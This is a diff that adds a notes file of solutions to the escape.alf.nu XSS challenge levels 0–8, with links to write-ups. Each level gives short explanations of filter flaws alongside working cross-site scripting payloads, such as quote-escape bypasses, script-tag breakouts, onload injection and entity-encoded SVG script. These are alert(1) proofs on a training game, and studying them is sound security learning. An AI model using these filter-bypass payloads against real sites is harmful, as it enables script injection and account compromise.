@@ -1,0 +1,64 @@
+Solutions
+http://podlipensky.com/2013/11/escape-unescaped/
+http://mixedquantum.blogspot.in/2013/10/xss-challenges-on-escapealfnu-part-1.html
+http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/
+https://rstforums.com/forum/79935-escape-alf-nu-xss-challenges-write-ups-part-1-a.rst
+
+Level 0
+");alert(1);<!--
+");alert(1)//
+
+Level 1
+Quotes are being escaped! But nothing else is, so we can escape the escape character so the quote isn't escaped
+\");alert(1)//
+
+Level 2
+JSON.stringify will escape both double quote and backslash
+http://www.whatwg.org/specs/web-apps/current-work/multipage/scripting.html#restrictions-for-contents-of-script-elements
+The JSON.stringify() method converts a value to JSON, optionally replacing values if a replacer function is specified, or optionally including only the specified properties if a replacer array is specified.
+</script><scriptalert(1)</script>
+
+Level 3
+JavaScript in the address bar. So we can no longer use the closing script tag trick. But, because this will be put in the address bar, the URL will be decoded. %22 is equivalent to ", but %22 won't be escaped by JSON.stringify()
+");alert(1)// -according to explanation-> %22);alert(1)//
+" alert(1) "  -according to explanation-> %22+alert(1)+%22
+Solutions
+%22+alert(1)+%22
+%22);alert(1)//
+
+Level 4
+https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace
+Unless you do a global regexp replace, only the first instance gets replaced. So we use extra quotes!
+No global flag in second replace function call
+I noted that server will load any image with alphanumeric name, i.e. a.gif is a valid image. So we have to use onload callback instead of onerror and two double quotes instead of one
+[[a|""onload="alert(1)]]
+
+Level 5
+Developer fixed his bug and all double quotes will be replaced
+Solutions : 
+[[a|http://onload=alert(1)//]]
+[[a|http://onload='alert(1)']]
+The description parameter has fewer restrictions when it is being matched by regexp
+After url replacement text will look like this:
+[[a|<a href="http://onload=alert(1)//]]">http://onload=alert(1)//]]</a>
+And after second one:
+<img alt="<a href=" http://onload=alert(1)//" src="a.gif"> ">http://onload=alert(1)//]]</a>
+And the browser will parse it as:
+<img alt="&lt;a href=" http:="" onload="alert(1)//&quot;" src="a.gif"> "&gt;http://onload=alert(1)//]]
+
+Level 6
+TextNode will escape everything
+Comment#><script>alert(1)</script>
+http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html
+Requires good understanding of document object and its methods. Method createComment will generate <!-- --> html. But since we can add basically anything between those brackets, we can force browser to close comment section earlier (by passing -->) and write arbitrary html after that.
+
+Level 7
+'#',alert(1)//
+
+Level 8
+Note: We can obtain any alphanumeric symbol by using type conversions and accessing characters by their index in the string
+http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html
+http://www.jsfuck.com/
+There is no escaping function, only an upper case, so we can close the exisiting <script> tag and create a new tag (case insensitive) with an onload script using no alpha characters:
+</script><svg><script>&#111&#110&#108&#111&#97&#100&#61&#97&#108&#101&#114&#116&#40&#49&#41//
+SVG stands for Scalable Vector Graphics.
